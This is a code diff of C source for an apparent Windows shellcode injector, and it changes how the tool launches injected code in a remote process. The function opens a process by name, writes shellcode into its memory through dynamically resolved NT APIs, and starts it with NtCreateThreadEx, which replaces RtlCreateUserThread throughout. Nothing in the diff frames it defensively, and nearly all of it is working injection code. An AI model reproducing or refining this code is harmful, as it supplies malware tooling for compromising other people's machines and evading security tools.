@@ -38,7 +38,7 @@ typedef NTSTATUS (NTAPI* pfnNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, 
 typedef NTSTATUS (NTAPI* pfnNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
 typedef NTSTATUS (NTAPI* pfnNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, CLIENT_ID*);
 typedef NTSTATUS (NTAPI* pfnNtClose)(HANDLE);
-typedef NTSTATUS (NTAPI* pfnRtlCreateUserThread)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE, CLIENT_ID*);
+typedef NTSTATUS (NTAPI* pfnNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
 typedef NTSTATUS (NTAPI* pfnNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
 
 // Declare global pointers to functions
@@ -46,7 +46,7 @@ pfnNtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
 pfnNtWriteVirtualMemory pNtWriteVirtualMemory = NULL;
 pfnNtOpenProcess pNtOpenProcess = NULL;
 pfnNtClose pNtClose = NULL;
-pfnRtlCreateUserThread pRtlCreateUserThread = NULL;
+pfnNtCreateThreadEx pNtCreateThreadEx = NULL;
 pfnNtQuerySystemInformation pNtQuerySystemInformation = NULL;
 
 // Function to dynamically load NTAPIs
@@ -57,7 +57,7 @@ void LoadAPIs() {
     pNtWriteVirtualMemory = (pfnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
     pNtOpenProcess = (pfnNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
     pNtClose = (pfnNtClose)GetProcAddress(hNtdll, "NtClose");
-    pRtlCreateUserThread = (pfnRtlCreateUserThread)GetProcAddress(hNtdll, "RtlCreateUserThread");
+    pNtCreateThreadEx = (pfnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
     pNtQuerySystemInformation = (pfnNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
 }
 
@@ -126,7 +126,7 @@ void inject_shellcode_procname_dyn_lib_NTAPI(unsigned char *shellcode, int shell
     DEBUG_PRINT("Loading dynamically NTAPIs...\n");    
     LoadAPIs();
     // Check initialization
-    if (!pNtAllocateVirtualMemory || !pNtWriteVirtualMemory || !pNtOpenProcess || !pNtClose || !pRtlCreateUserThread || !pNtQuerySystemInformation) return; 
+    if (!pNtAllocateVirtualMemory || !pNtWriteVirtualMemory || !pNtOpenProcess || !pNtClose || !pNtCreateThreadEx || !pNtQuerySystemInformation) return; 
 
 
     DEBUG_PRINT("Extracted payload_info::process_name argument = %s\n", target_process);
@@ -180,7 +180,7 @@ void inject_shellcode_procname_dyn_lib_NTAPI(unsigned char *shellcode, int shell
     // Create and start new thread in the remote process, executing the shellcode
     DEBUG_PRINT("Creating new remote thread to execute shellcode...\n");
     HANDLE hThread = NULL;
-    status = pRtlCreateUserThread(hProc, NULL, FALSE, 0, NULL, NULL, pRemoteCode, NULL, &hThread, NULL);
+    status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, pRemoteCode, NULL, FALSE, 0, 0, 0, NULL);   
     if (!NT_SUCCESS(status) || hThread == NULL){
         DEBUG_PRINT("Thread creation failed.\n");
         return;
